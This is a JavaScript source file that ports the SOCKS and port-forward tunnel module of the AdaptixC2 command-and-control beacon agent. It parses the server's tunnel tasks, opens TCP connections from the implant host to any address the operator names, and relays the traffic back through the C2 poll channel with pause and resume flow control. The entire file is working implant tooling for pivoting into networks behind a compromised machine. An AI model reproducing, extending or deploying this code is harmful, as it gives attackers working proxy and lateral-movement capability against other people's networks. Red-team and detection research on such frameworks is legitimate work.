// Ported from AdaptixC2 (https://github.com/Adaptix-Framework/AdaptixC2),
// AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Commander.cpp (tunnel commands 62/64/66/69/70 + reply framing) — GPLv3, (c) the
// AdaptixC2 authors. Structural fidelity is deliberate; deviations are noted inline.
// tunnel.js — GUI-native tunneling (framework SOCKS/portfwd through the C2).
//
// The teamserver listens for SOCKS/portfwd clients ITSELF (TsTunnelStart does
// net.Listen) and translates every accepted client into beacon tunnel tasks
// that ride the normal poll stream — no WS channel, no extra infra. Wire
// truth: AdaptixServer/extenders/beacon_agent/pl_main.go (TunnelMessage* +
// ProcessData cases 62-70) and src_beacon/beacon/{Commander,Proxyfire}.cpp.
//
// Server -> agent tasks (LE TaskReader, args BEFORE the trailing taskId):
//   62 START_TCP : u32 channelId, u32 tunnelType, str address, u32 port
//   64 WRITE_TCP : u32 channelId, u32 len, bytes data
//   66 CLOSE     : u32 channelId                 (no reply; just destroy)
//   69 PAUSE     : u32 channelId                 (server is slow — hold pump)
//   70 RESUME    : u32 channelId
//
// Agent -> server replies (BE; the poll body has ONE outer total, then flat
// [taskId][cmdId][fields]* frames — pl_main.go ProcessData. taskId IS the
// channelId):
//   status : [chId][62|66][u32 type][u32 result]   result 0=ok, 1=close, else WSA code
//   write  : [chId][64][u32 len][bytes]            (OutPacker.bytes layout)
//   control: [chId][69] / [chId][70]               agent-side flow control
//
// The C implant leaves the trailing taskId unread for 66/69/70 (the orphan
// u32 is skipped by Commander's `default: break`); our reader always consumes
// it, which keeps the stream aligned without relying on that quirk.
const net = require('net');

const CMD = {
  START_TCP: 62,
  WRITE_TCP: 64,
  CLOSE: 66,
  PAUSE: 69,
  RESUME: 70,
};

// Proxyfire.h: TUNNEL_CREATE_SUCCESS 0 / TUNNEL_CREATE_ERROR 1
const RESULT_OK = 0;
const RESULT_CLOSE = 1;

// Node errno -> Windows WSA error (server maps 10061 -> SOCKS5 CONNECTION_REFUSED,
// everything else -> HOST_UNREACHABLE; Proxyfire sends raw WSA codes).
const WSA = {
  ECONNREFUSED: 10061,
  ETIMEDOUT: 10060,
  ENOTFOUND: 11001, // WSAHOST_NOT_FOUND
  EAI_AGAIN: 11002,
  EHOSTUNREACH: 10065,
  ENETUNREACH: 10051,
  EACCES: 10013,
  ECONNRESET: 10054,
  ECONNABORTED: 10053,
};

const HIGH_WATER = 1 << 20;    // pause the server (send 69) above 1MB buffered
const LOW_WATER = 256 << 10;   // resume (70) below 256KB
const DIAL_TIMEOUT = 8000;     // Proxyfire waits up to 30s; 8s keeps ticks snappy

const ts = () => new Date().toISOString().slice(11, 19);

function createTunnels(opts) {
  const log = opts.log || (() => {});
  const conns = new Map(); // channelId -> { sock, paused, pending: Buffer[] }
  const queue = [];        // reply frames built between ticks, flushed by pump()

  // ---- reply frame builders (BE, NO outer total — pump() pushes them as
  // flat parts of the tick's OutPacker, whose build() adds the one total)
  function push(frame) { queue.push(frame); }
  function frameStatus(chId, cmdId, type, result) {
    const b = Buffer.alloc(16);
    b.writeUInt32BE(chId >>> 0, 0);
    b.writeUInt32BE(cmdId, 4);
    b.writeUInt32BE(type >>> 0, 8);
    b.writeUInt32BE(result >>> 0, 12);
    return b;
  }
  function frameWrite(chId, data) {
    const head = Buffer.alloc(12);
    head.writeUInt32BE(chId >>> 0, 0);
    head.writeUInt32BE(CMD.WRITE_TCP, 4);
    head.writeUInt32BE(data.length, 8);
    return Buffer.concat([head, data]);
  }
  function frameControl(chId, cmdId) {
    const b = Buffer.alloc(8);
    b.writeUInt32BE(chId >>> 0, 0);
    b.writeUInt32BE(cmdId, 4);
    return b;
  }

  function wsaCode(e) { return WSA[e && e.code] || RESULT_CLOSE; }

  function buffered(chId) {
    const t = conns.get(chId);
    if (!t) return 0;
    let n = t.sock.writableLength || 0;
    for (const p of t.pending) n += p.length;
    return n;
  }

  function maybePause(chId) {
    const t = conns.get(chId);
    if (t && !t.wePaused && buffered(chId) > HIGH_WATER) {
      t.wePaused = true;
      push(frameControl(chId, CMD.PAUSE));
      log(`[tun] ${chId}: pause (buffer ${buffered(chId)}B)`);
    }
  }
  function maybeResume(chId) {
    const t = conns.get(chId);
    if (t && t.wePaused && buffered(chId) < LOW_WATER) {
      t.wePaused = false;
      push(frameControl(chId, CMD.RESUME));
      log(`[tun] ${chId}: resume`);
    }
  }

  // ---- task handlers -------------------------------------------------------
  function startTcp(r) {
    const chId = r.u32();
    const tunnelType = r.u32();
    const address = r.str();
    const port = r.u32();
    const taskId = r.u32(); // trailing uid — C reads it for 62, we ignore it too

    if (tunnelType === 2 || tunnelType === 3) { /* socks5/auth: plain TCP dial, same path */ }
    const sock = net.connect({ host: address, port });
    const t = { sock, paused: false, wePaused: false, pending: [], held: [], type: tunnelType, opening: true };
    conns.set(chId, t);

    sock.setTimeout(DIAL_TIMEOUT, () => {
      if (t.opening) {
        t.opening = false;
        push(frameStatus(chId, CMD.START_TCP, tunnelType, WSA.ETIMEDOUT));
        log(`[tun] ${chId}: dial timeout ${address}:${port}`);
        sock.destroy();
        conns.delete(chId);
      }
    });

    sock.once('connect', () => {
      sock.setTimeout(0);
      t.opening = false;
      push(frameStatus(chId, CMD.START_TCP, tunnelType, RESULT_OK));
      log(`[tun] ${chId}: CONNECTED ${address}:${port}`);
      // flush anything the server wrote before OPEN_OK reached it
      if (t.pending.length) {
        for (const p of t.pending) sock.write(p);
        t.pending = [];
        maybeResume(chId);
      }
    });

    sock.once('error', (e) => {
      if (t.opening) {
        t.opening = false;
        push(frameStatus(chId, CMD.START_TCP, tunnelType, wsaCode(e)));
        log(`[tun] ${chId}: dial fail ${address}:${port} — ${e.code || e.message}`);
      } else {
        // mid-stream failure: tell the server to drop the channel
        push(frameStatus(chId, CMD.CLOSE, 0, RESULT_CLOSE));
        log(`[tun] ${chId}: socket error ${e.code || e.message}`);
      }
      sock.destroy();
      conns.delete(chId);
    });

    sock.on('data', (chunk) => {
      if (t.paused) { t.held.push(chunk); maybePause(chId); return; } // server is slow — hold
      push(frameWrite(chId, chunk));
      maybePause(chId);
    });

    sock.once('close', () => {
      if (conns.delete(chId)) {
        push(frameStatus(chId, CMD.CLOSE, 0, RESULT_CLOSE)); // server closes the client
        log(`[tun] ${chId}: remote close`);
      }
    });

    return { chId, taskId, address, port, type: tunnelType }; // for tests/logging
  }

  function writeTcp(r) {
    const chId = r.u32();
    const data = r.raw();
    r.u32(); // trailing taskId
    const t = conns.get(chId);
    if (!t) return null; // unknown/closed channel — drop silently
    if (t.opening) {
      t.pending.push(data);
      maybePause(chId);
    } else {
      t.sock.write(data);
      maybePause(chId);
    }
    return { chId, len: data.length };
  }

  function closeTcp(r) {
    const chId = r.u32();
    r.u32(); // trailing taskId
    const t = conns.get(chId);
    if (t) { conns.delete(chId); try { t.sock.destroy(); } catch (_) {} }
    log(`[tun] ${chId}: server closed`);
    return { chId };
  }

  function pause(chId) { const t = conns.get(chId); if (t) t.paused = true; }
  function resume(chId) {
    const t = conns.get(chId);
    if (t && t.paused) {
      t.paused = false;
      if (t.held.length) {
        for (const chunk of t.held) push(frameWrite(chId, chunk)); // flush toward the server
        t.held = [];
      }
      if (t.pending.length && !t.opening) { // also drain dial-phase writes if any
        for (const p of t.pending) t.sock.write(p);
        t.pending = [];
      }
      maybeResume(chId);
    }
  }

  // dispatch inside agent.js handleTask — returns { reply: null } (async replies)
  function handleTask(commandId, r) {
    if (commandId === CMD.START_TCP) { startTcp(r); return true; }
    if (commandId === CMD.WRITE_TCP) { writeTcp(r); return true; }
    if (commandId === CMD.CLOSE) { closeTcp(r); return true; }
    if (commandId === CMD.PAUSE) { const chId = r.u32(); r.u32(); pause(chId); return true; }
    if (commandId === CMD.RESUME) { const chId = r.u32(); r.u32(); resume(chId); return true; }
    return false;
  }

  // flush frames queued since the last tick into the outgoing poll body —
  // flat parts (the tick OutPacker's build() adds the single outer total)
  function pump(outputs) {
    if (!queue.length) return 0;
    const frames = queue.splice(0);
    for (const f of frames) outputs.parts.push(f);
    return frames.length;
  }

  function closeAll() {
    for (const [chId, t] of conns) { try { t.sock.destroy(); } catch (_) {} conns.delete(chId); }
    queue.length = 0;
  }

  return {
    handleTask, pump, closeAll,
    count: () => conns.size,
    queued: () => queue.length,
    frames: () => queue,
    _internals: { frameStatus, frameWrite, frameControl, WSA, CMD, conns, startTcp, writeTcp, closeTcp, pause, resume, queue },
  };
}

module.exports = { createTunnels, CMD, WSA, RESULT_OK, RESULT_CLOSE, HIGH_WATER, LOW_WATER };
